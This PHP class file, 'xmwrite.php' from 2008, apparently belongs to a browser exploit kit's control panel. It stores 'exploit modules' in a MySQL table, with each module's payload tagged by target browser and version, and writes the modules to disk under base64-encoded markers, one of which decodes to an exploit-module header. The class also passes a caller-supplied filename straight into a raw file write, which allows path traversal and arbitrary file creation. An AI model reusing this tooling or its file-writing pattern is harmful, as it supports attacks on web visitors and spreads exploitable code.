 <?php
/***************************************************************************
 *   Copyright (C) 2008 by Zer0day					   *
 *   zer0day@mail.ru   						   *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   any later version.                                                    *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program; if not, write to the                         *
 *   Free Software Foundation, Inc.                                        *
 *   File: xmwrite.php							   *
 ***************************************************************************/

class xmwrite{

	var $error = "";
	var $name = "Unknown";
	var $payload = "Unknown";
	var $browser = "Unknown";
	var $version = "Unknown";
	var $code = "";
	var $active = "true";

	function xmwrite($name, $payload, $browser, $version, $code, $filename, $active){

		require_once('mysql_connect.php');
	
		// inserting into mysqldb!
		$sql = 'INSERT INTO `'._PREFIX_.'xmodules` (`name`, `payload`, `browser`, `version`, `filename`, `active`) VALUES (CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($name)).'\' USING latin1) , CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($payload)).'\' USING latin1), CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($browser)).'\' USING latin1), CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($version)).'\' USING latin1), CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($filename)).'\' USING latin1), CONVERT(_utf8 \''.mysql_escape_string(htmlspecialchars($active)).'\' USING latin1) COLLATE latin1_swedish_ci);';
		$check = mysql_query($sql) OR die(mysql_error());

		$name=base64_encode($name);
		$browser=base64_encode($browser);
		$version=base64_encode($version);

		if(file_exists("xmodules/".$filename)) {
			return 0;
		}
		if($payload=="#!binary!#") {
			$mf=fopen("xmodules/".$filename, "wb");
			fwrite($mf, stripslashes($code));
			fclose($mf);
		} else {
		$payload=base64_encode($payload);
		$code=base64_encode($code);
		$mf=fopen("xmodules/".$filename, "w");
		fwrite($mf, "I3htb2R1bGVfZXhwbG9pdF9tb2R1bGUxLjAj\n");
		fwrite($mf, $name."\n");
		fwrite($mf, $payload."\n");
		fwrite($mf, $browser."\n");
		fwrite($mf, $version."\n");
		fwrite($mf, "I2NvZGVfc3RhcnQj\n");
		fwrite($mf, $code."\n");
		fwrite($mf, "I2NvZGVfZW5kIw==\n");
		fclose($mf);
		}
		}
	}
?>